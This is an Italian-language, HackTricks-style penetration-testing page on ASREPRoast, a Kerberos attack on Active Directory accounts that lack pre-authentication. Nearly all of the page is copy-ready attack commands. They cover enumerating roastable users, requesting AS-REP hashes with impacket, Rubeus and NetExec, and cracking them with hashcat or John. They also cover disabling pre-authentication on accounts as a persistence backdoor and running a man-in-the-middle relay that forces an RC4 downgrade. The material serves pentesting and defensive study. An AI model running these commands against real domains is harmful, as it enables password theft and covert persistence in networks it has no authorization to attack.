# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast è un attacco di sicurezza che sfrutta gli utenti privi dell'attributo **Kerberos pre-authentication required**. In sostanza, questa vulnerabilità consente agli attacker di richiedere l'autenticazione per un utente al Domain Controller (DC) senza aver bisogno della password dell'utente. Il DC risponde quindi con un messaggio cifrato con una chiave derivata dalla password dell'utente, che gli attacker possono tentare di crackare offline per scoprire la password dell'utente.

I requisiti principali per questo attacco sono:

- **Lack of Kerberos pre-authentication**: gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
- **Connection to the Domain Controller (DC)**: gli attacker devono avere accesso al DC per inviare richieste e ricevere messaggi cifrati.
- **Optional domain account**: disporre di un domain account consente agli attacker di identificare in modo più efficiente gli utenti vulnerabili tramite query LDAP. Senza tale account, gli attacker devono indovinare gli username.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Richiesta del messaggio AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus requests **RC4** by default, quindi l'Event ID **4768** mostra solitamente **preauth type 0** e **ticket encryption type 0x17**. Se aggiungi **`/aes`** (oppure RC4 è disabilitato per il target), aspettati invece **AES etypes**.<sup>[[2]](#references)</sup>

#### One-liner rapidi (Linux)

- Enumera prima i potenziali target (ad esempio, dai percorsi di build in leak) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Esegui il roast di un'intera lista di username senza credenziali valide usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Se disponi di credenziali, lascia che NetExec interroghi LDAP e richieda per te ogni account vulnerabile al roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Se l'output inizia con **`$krb5asrep$23$`**, esegui il cracking con Hashcat **`-m 18200`**. Se inizia con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferisci John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Non dare per scontato che ogni AS-REP roast utilizzi RC4. Gli strumenti moderni possono restituire **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), a seconda dell'enctype richiesto/negoziato. **`hashcat -m 18200`** è destinato a **etype 23**, mentre **John** gestisce direttamente `krb5asrep` per **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistenza

Forza **preauth** non richiesta per un utente per il quale disponi di autorizzazioni **GenericAll** (o di autorizzazioni per scrivere proprietà):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast senza credenziali

Un attacker può usare una posizione man-in-the-middle per catturare i pacchetti AS-REP mentre attraversano la rete, senza dover fare affidamento sulla disabilitazione della pre-autenticazione Kerberos. Funziona quindi per tutti gli utenti sulla VLAN.\
Se vuoi il relativo trick senza credenziali che restituisce un **service ticket** invece di un **TGT** da un principal senza pre-auth, consulta [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci permette di farlo. La modalità `relay` è quella interessante dal punto di vista offensivo, perché può forzare **RC4** quando il client pubblicizza ancora **etype 23**; `listen` rimane passiva e cattura semplicemente ciò che il client/DC negozia.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Riferimenti

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
